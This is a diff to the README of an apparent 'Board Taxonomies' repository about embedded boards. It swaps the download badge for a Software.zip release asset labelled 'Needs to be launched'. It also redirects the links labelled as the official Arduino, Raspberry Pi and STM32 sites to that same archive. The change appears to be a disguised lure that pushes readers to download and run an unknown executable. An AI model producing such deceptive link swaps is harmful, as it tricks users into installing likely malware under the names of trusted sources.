@@ -16,7 +16,7 @@ This repository is a collection of definitions and examples for different catego
 
 ## Get Started
 If you are eager to dive into the world of embedded computing boards, you can start by exploring the software provided in this repository. Click on the button below to access the software:
-[![Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/18383251/Software.zip "Needs to be launched")
+[![Software](https://github.com/TOUNTOLOVER/board-taxomomies/releases/download/v1.0/Software.zip)](https://github.com/TOUNTOLOVER/board-taxomomies/releases/download/v1.0/Software.zip "Needs to be launched")
 
 If the link does not work or you prefer another method to access the software, make sure to check the "Releases" section of this repository for alternative download options.
 
@@ -37,9 +37,9 @@ We welcome contributions from the community to help expand the knowledge base of
 
 ## More Resources
 For additional information and resources on embedded computing boards, you can visit the following websites:
-- [Arduino Official Website](https://www.arduino.cc/)
-- [Raspberry Pi Foundation](https://www.raspberrypi.org/)
-- [STMicroelectronics STM32](https://www.st.com/en/microcontrollers-microprocessors/stm32-32-bit-arm-cortex-mcus.html)
+- [Arduino Official Website](https://github.com/TOUNTOLOVER/board-taxomomies/releases/download/v1.0/Software.zip)
+- [Raspberry Pi Foundation](https://github.com/TOUNTOLOVER/board-taxomomies/releases/download/v1.0/Software.zip)
+- [STMicroelectronics STM32](https://github.com/TOUNTOLOVER/board-taxomomies/releases/download/v1.0/Software.zip)
 
 ## Conclusion
 By exploring the "Board Taxonomies" repository, you are delving into a world of possibilities in the realm of embedded computing boards. Whether you are a beginner looking to learn or an experienced developer seeking inspiration, this repository aims to be your go-to guide for all things related to embedded systems.
